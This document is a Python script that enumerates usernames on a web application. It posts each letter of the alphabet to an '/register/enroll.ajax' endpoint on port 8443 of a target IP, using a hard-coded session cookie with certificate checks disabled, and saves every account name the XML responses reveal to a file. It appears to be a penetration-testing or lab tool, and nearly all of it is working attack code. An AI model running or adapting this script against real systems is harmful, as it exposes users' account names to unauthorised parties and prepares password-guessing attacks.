import string
import xml.etree.ElementTree as ET
import requests
from urllib3.exceptions import InsecureRequestWarning

IP = "" #CHANGME

url = f"https://{IP}:8443/register/enroll.ajax"
cookie = {'JSESSIONID':'857CF117481685137A8D75BD122C1296'}
# proxy = {"https":"https://127.0.0.1:8080"}
user_list = []
file = open("users.txt","w")
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

letters_list = list(string.ascii_letters[:26])
for letter in letters_list:
    body = {"username":letter}
    #xml_response = requests.post(url, data=body, verify=False, cookies=cookie, proxies=proxy).content.decode()
    xml_response = requests.post(url, data=body, verify=False, cookies=cookie).content.decode()
    xml_tree = ET.fromstring(xml_response)
    for user in xml_tree:
        if user.text not in user_list:
            user_list.append(user.text)

for user in user_list:
    file.write(user + "\n")

print("[!] Done.")
file.close()
